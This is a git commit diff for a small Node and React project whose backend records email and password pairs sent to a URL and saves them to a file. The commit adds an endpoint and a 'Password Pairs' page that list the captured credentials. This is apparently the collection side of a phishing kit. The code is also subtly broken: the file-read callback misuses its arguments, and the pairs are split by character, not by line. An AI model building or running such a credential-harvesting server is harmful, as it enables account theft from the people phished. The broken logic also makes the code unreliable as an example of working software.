1e93365493c54a5eba3a05a4327b15e89423f91a
Kognise <felix.mattick@gmail.com>
2019-05-19 10:26:26 -0400

    Add pairs gui

--- backend/index.js
+++ backend/index.js
@@ -7,11 +7,30 @@ const append = (email, password) => new Promise((resolve) => {
     fs.appendFile('data/pairs.txt', `\n${email}:${password}`, resolve)
   }
 })
+const getPairs = () => new Promise((resolve) => {
+  if (!fs.existsSync('data/pairs.txt')) {
+    resolve('')
+  } else {
+    fs.readFile('data/pairs.txt', (data) => resolve(data.toString()))
+  }
+})
 app.get('/backend/:email/:password', async (req, res) => {
   console.log(`> Email: '${req.params.email}'`)
   console.log(`> Password: '${req.params.password}'`)
   await append(req.params.email, req.params.password)
   res.header('Access-Control-Allow-Origin', '*')
   res.end()
+})
+app.get('/backend/pairs', async (req, res) => {
+  const pairs = await getPairs()
+  const json = pairs.split('').map((pair) => {
+    const split = pair.split(':')
+    return {
+      email: split[0],
+      password: split[1]
+    }
+  })
+  res.header('Access-Control-Allow-Origin', '*')
+  res.json(json)
 })
 app.listen(3001, () => console.log('> Ready on port 3001'))
---
+++ frontend/pages/pairs.js
@@ -0,0 +1,52 @@
+import { useState, useEffect } from 'react'
+
+export default () => {
+  const [ loading, setLoading ] = useState(true)
+  const [ pairs, setPairs ] = useState([])
+
+  useEffect(() => {
+    fetch('/backend/pairs').then((res) => {
+      return res.json()
+    }).then((json) => {
+      setPairs(json)
+      setLoading(false)
+    })
+  }, [])
+
+  return (
+    <>
+      <h1>Password Pairs</h1>
+      {loading && <p>Loading...</p>}
+      <ul>
+        {pairs.map(({ email, password }) => (
+          <li>
+            {email}: {password}
+          </li>
+        ))}
+      </ul>
+      <style jsx global>{`
+        @import url('https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap');
+        @font-face {
+          font-family: 'Google Sans';
+          src: url('https://fonts.gstatic.com/s/googlesans/v9/4UaGrENHsxJlGDuGo1OIlL3Owp4.woff2');
+          font-weight: 400;
+        }
+
+        body {
+          margin: 0 auto;
+          max-width: 500px;
+          font-family: 'Roboto', sans-serif;
+          font-size: 16px;
+        }
+        h1 {
+          font-family: 'Google Sans', sans-serif;
+          font-weight: 400;
+          font-size: 24px;
+          line-height: 1.333;
+          padding-top: 16px;
+          margin: 0;
+        }
+      `}</style>
+    </>
+  )
+}
